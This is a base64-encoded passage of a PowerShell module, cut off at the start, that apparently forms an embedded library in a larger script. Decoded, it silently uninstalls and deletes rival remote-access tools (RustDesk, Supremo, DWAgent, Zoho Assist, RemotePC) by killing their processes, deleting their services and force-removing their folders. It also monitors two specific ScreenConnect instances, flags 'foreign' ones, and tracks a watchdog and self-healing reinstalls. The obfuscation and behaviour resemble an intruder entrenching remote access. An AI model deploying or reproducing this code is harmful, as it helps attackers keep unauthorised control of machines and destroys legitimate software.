bGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIiwiJGVudjpB
UFBEQVRBXFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQ0KICAgICAgICBAeyBUYWc9
J1N1cHJlbW8nOyAgICAgU3ZjPUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3VwcmVtbyonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XFN1cHJlbW8iKTsgUHJvZD1AKCdTdXByZW1vKicpIH0NCiAgICAgICAgQHsgVGFnPSdEV1NlcnZp
Y2UnOyAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQq
JykgfQ0KICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywn
Wm9ob01lZXRpbmcqJyk7IFByb2M9QCgnWm9ob0Fzc2lzdConLCdab2hvVVJTQionKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xab2hvTWVldGluZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxab2hvTWVldGluZyIpOyBQcm9kPUAoJ1pvaG8gQXNzaXN0KicpIH0NCiAgICAgICAgQHsgVGFn
PSdSZW1vdGVQQyc7ICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1vdGVQQyonLCdS
UENTdWl0ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZW1vdGVQQyIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicpIH0NCiAgICAp
DQogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgew0KICAgICAgICAkaGl0ID0gJGZhbHNlDQog
ICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuUHJvZCkgew0KICAgICAgICAgICAgZm9yZWFj
aCAoJHJvb3QgaW4gJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJz
aW9uXFVuaW5zdGFsbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09G
VFdBUkVcV09XNjQzMk5vZGVcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykgew0KICAgICAgICAg
ICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
fCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVBy
b3BlcnR5ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRk
biAtYW5kICRkbiAtbGlrZSAkcGF0IC1hbmQgJF8uUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpIHsN
CiAgICAgICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAt
QXJndW1lbnRMaXN0ICIveCAkKCRfLlBTQ2hpbGROYW1lKSAvcW4gL25vcmVzdGFydCIgLVdhaXQg
LVBhc3NUaHJ1DQogICAgICAgICAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVl
OyBMb2cgInJtbV9wcm9kdWN0X3VuaW5zdGFsbGVkIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSki
DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9
DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5TdmMpIHsNCiAgICAg
ICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgk
Xy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1p
bGxpc2Vjb25kcyA4MDANCiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFt
ZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRy
dWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRvb2wuVGFnKV0iDQogICAg
ICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9j
KSB7DQogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgIFN0b3AtUHJv
Y2VzcyAtSWQgJF8uSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
ICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJvY19raWxsZWQg
JCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iDQogICAgICAgICAgICB9DQogICAgICAg
IH0NCiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykgew0KICAgICAgICAgICAgaWYg
KCRkIC1hbmQgKFRlc3QtUGF0aCAkZCkpIHsNCiAgICAgICAgICAgICAgICBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfUHJvY2VzcyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
ICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhl
Y3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCkgfSB8DQogICAgICAgICAgICAgICAgICAgIEZvckVh
Y2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgICAgICAgICAmIHRha2Vvd24uZXhlIC9G
ICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgJiBpY2FjbHMuZXhl
ICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgMj4mMSB8IE91dC1OdWxsDQogICAg
ICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBh
dGggJGQpIHsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMjsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRo
ICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAg
ICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkZCkgeyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxF
RCAkZCIgfSBlbHNlIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92
ZWQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGhpdCkgeyBM
b2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5UYWcpIiB9DQogICAgfQ0KDQogICAgcmV0dXJu
ICJleHRlcm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIp
IHByb2R1Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgkbi5ybW0pIg0KfQ0KDQpmdW5jdGlvbiBVcGRh
dGUtU3RhdGUgew0KICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbA0KICAgIGZvcmVhY2gg
KCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgew0K
ICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgew0KICAg
ICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAnNWY2MDEwNTc5ODUyZTUwNycpIHsgJHByaW0g
PSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVx
ICdmODYxYzgxNDBkNDUzNDI3JykgeyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAg
IH0NCiAgICB9DQogICAgJGZvcmVpZ24gPSBAKCkNCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQt
U2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRz
dmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90
aW4gQCgnNWY2MDEwNTc5ODUyZTUwNycsJ2Y4NjFjODE0MGQ0NTM0MjcnKSkgew0KICAgICAgICAg
ICAgJGZvcmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkaWQgPSBS
ZWFkLUlkZW50aXR5DQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9IDANCiAgICBmb3Jl
YWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFTS19EJykgew0KICAgICAg
ICAkdGFza3NUb3RhbCsrDQogICAgICAgICYgc2NodGFza3MuZXhlIC9RdWVyeSAvVE4gJGlkWyRr
XSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJHRh
c2tzT2srKyB9DQogICAgfQ0KICAgICR3ZCA9IEVuc3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0g
QHt9DQogICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAg
ICBpZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsNCiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50
IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVj
dC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVl
IH0gfSBjYXRjaCB7fQ0KICAgIH0NCiAgICAkaW5zdGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJl
di5pbnN0YWxsQ291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50
IH0NCiAgICBpZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5k
ICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0NCiAgICAkc3RhdGUgPSBb
b3JkZXJlZF1Aew0KICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQ0KICAg
ICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5n
KCdvJykNCiAgICAgICAgYnVpbGQgICAgICAgID0gJEJ1aWxkDQogICAgICAgIHByaW0gICAgICAg
ICA9ICQoaWYgKCRwcmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBh
bHQgICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pDQog
ICAgICAgIGZvcmVpZ24gICAgICA9ICRmb3JlaWduDQogICAgICAgIHRhc2tzT2sgICAgICA9ICR0
YXNrc09rDQogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsDQogICAgICAgIHdhdGNo
ZG9nICAgICA9ICR3ZA0KICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50DQogICAg
ICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2Fs
VGltZSgpLlRvU3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxh
c3RIZWFsIH0gZWxzZSB7ICRudWxsIH0pDQogICAgICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQ0K
ICAgIH0NCiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250
ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQ0KICAgIHJldHVybiAkc3RhdGUNCn0N
Cg0Kc3dpdGNoICgkQWN0aW9uKSB7DQogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0
aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAi
JCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0NCiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9
IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIk
KCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0KICAgICd3YXRjaGRvZycgICAgICAgIHsgSW5zdGFs
bC1XYXRjaGRvZyB8IE91dC1OdWxsIH0NCiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1X
YXRjaGRvZyB9DQogICAgJ3N0YXRlJyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0
VG8tSnNvbiAtQ29tcHJlc3MgfQ0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVwYWlyLVNDU2Vy
dmljZSAkRnAgfQ0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVzdC1TQ1JlZ2lzdGVyZWQgJEZw
IH0NCiAgICAnZXh0ZXJtaW5hdGUnICAgICB7IEludm9rZS1FeHRlcm1pbmF0ZSB9DQp9DQo=
::B64_LIB_END